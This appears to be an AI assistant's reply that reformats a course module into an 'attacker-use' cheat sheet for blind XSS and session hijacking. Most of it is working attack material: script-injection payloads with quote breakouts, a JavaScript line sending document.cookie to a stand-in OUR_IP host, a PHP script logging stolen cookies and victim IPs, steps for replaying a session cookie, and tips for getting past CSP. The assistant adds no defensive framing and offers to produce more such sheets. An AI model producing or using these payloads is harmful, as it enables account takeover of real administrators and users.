Here is the **Blind XSS & Session Hijacking** module distilled into the exact same clean, Obsidian-ready, attacker-use format. 

Zero fluff. Pure workflow, payloads, and execution steps.

---

`md
## 🧠 Blind XSS & Session Hijacking Cheat Sheet

---

### 🎯 1. Core Concept

> [!INFO]
> **Goal:** Steal session cookies from a page the attacker cannot directly access (e.g., Admin Panel, Support Ticket backend).
> **Mechanism:** Inject a payload that loads a remote JavaScript file. When the admin views the page, the script executes, exfiltrating `document.cookie` to the attacker's server.

---

### 🧪 2. Blind XSS Discovery Workflow

Since you cannot see the output, you must use **out-of-band (OOB) detection** to find the vulnerable field and the correct syntax.

> [!SUCCESS] **Step-by-Step Discovery**
> 1. Start a listener on your machine (Port 80).
> 2. Identify input fields (Name, Username, Website, User-Agent). *Skip strictly validated fields like Email or hashed Passwords.*
> 3. Inject a **unique remote script payload** into *each* field to identify which one triggers.
> 4. Wait for the HTTP request on your listener. The requested path tells you the vulnerable field.

---

### 🧬 3. Discovery Payloads (Remote Script)

Use these to test context breakout and identify the vulnerable field. Replace `OUR_IP` and `fieldname` (e.g., `username`, `website`, `user-agent`).

```html
<!-- Basic -->
<script src="http://OUR_IP/fieldname"></script>

<!-- Attribute Breakout (Single Quote) -->
'><script src="http://OUR_IP/fieldname"></script>

<!-- Attribute Breakout (Double Quote) -->
"><script src="http://OUR_IP/fieldname"></script>

<!-- DOM / JavaScript Context -->
javascript:eval('var a=document.createElement("script");a.src="http://OUR_IP/fieldname";document.body.appendChild(a)')
```

> [!CHECK]  
> If you see `GET /username HTTP/1.1` on your server, the `username` field is vulnerable and the basic `<script>` tag worked. Use that syntax for the next step.

---

### 💥 4. The Final Exploit Payload

Once the vulnerable field and syntax are known, switch from discovery to **cookie exfiltration**.

#### 🔹 Step A: Create the Exfiltration Script (`script.js`)
Host this on your attacker server. Using `new Image()` is stealthier than `document.location` as it doesn't redirect the victim's browser.
```javascript
new Image().src = 'http://OUR_IP/index.php?c=' + document.cookie;
```

#### 🔹 Step B: The Injected XSS Payload
Update your payload to point to the malicious script.
```html
<script src="http://OUR_IP/script.js"></script>
```
*(Apply the correct quote breakout discovered in Step 3, e.g., `"><script src=...`)*

---

### ⚙️ 5. Cookie Harvesting Setup

Use a PHP script to catch the exfiltrated cookie, parse it cleanly, and log it with the victim's IP.

**1. Create `index.php` on your attacker server:**
```php
<?php
if (isset($_GET['c'])) {
    // Split multiple cookies by semicolon
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode(trim($value));
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**2. Start the PHP Server:**
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# Save script.js and index.php here
sudo php -S 0.0.0.0:80
```

---

### 🔍 6. Execution & Hijacking Workflow (REAL METHOD)

> [!SUCCESS]

1. **Recon:** Submit the discovery payloads to all viable fields.
2. **Identify:** Check terminal for `GET /fieldname`. Note the working syntax.
3. **Weaponize:** Create `script.js` and update the XSS payload to point to it.
4. **Inject:** Submit the final payload to the vulnerable field (e.g., register a new user, submit a support ticket).
5. **Wait & Verify:** Wait for the admin to view the data. Check terminal for:
   - `GET /script.js`
   - `GET /index.php?c=PHPSESSID=abc123...`
6. **Harvest:** Run `cat cookies.txt` to get the clean session token.
7. **Hijack:** 
   - Navigate to the target application's login/page URL.
   - Open **Firefox DevTools** (`Shift + F9`) → **Storage** tab.
   - Click **+** to add a new cookie.
   - **Name:** Part before `=` (e.g., `PHPSESSID` or `session`).
   - **Value:** Part after `=` (e.g., `abc123...`).
   - **Path:** `/` (or the specific app path).
8. **Refresh:** The page will now load as the victim.

---

### 🧠 7. High-Value Blind XSS Vectors

> [!ABSTRACT]

- **Support Ticket Systems:** Descriptions, attachments, reply fields.
- **User Registration/Profile:** Website URL, Bio, Full Name.
- **Feedback/Contact Forms:** Message body.
- **HTTP Headers:** `User-Agent`, `X-Forwarded-For`, `Referer` (often logged and viewed by admins in analytics dashboards).
- **Internal Wikis/CRMs:** Any field rendered in an admin review queue.

---

## ⚠️ Operator Notes

> [!FAILURE]

If the attack fails:
- **No HTTP request received:** The field is sanitized, or the payload syntax (quotes) is wrong. Try different breakouts.
- **Cookie is `HttpOnly`:** JavaScript *cannot* read `HttpOnly` cookies. Blind XSS will fail for session hijacking here (pivot to phishing or look for other non-HttpOnly tokens).
- **CSP Blocking:** If a strict Content Security Policy blocks external scripts (`script-src 'self'`), fallback to inline event handlers or data exfiltration via `<img src="http://OUR_IP/?c=...">` directly in the payload.

---

> [!ATTENTION]

**Patience is key in Blind XSS.**  
The payload may sit dormant for hours or days until an administrator reviews the submission. Ensure your listener is persistent (or use a tool like XSS Hunter / Interact.sh) and your `script.js` is reliably hosted.
```

---

### 🔥 Ready for the next one?
This format is locked and loaded. Drop the next module text (e.g., **DOM XSS**, **CSP Bypass**, **XSS Hunter / Blind XSS Automation**, or **Polyglots**), and I will compress it into this exact same operational cheat sheet. 🎯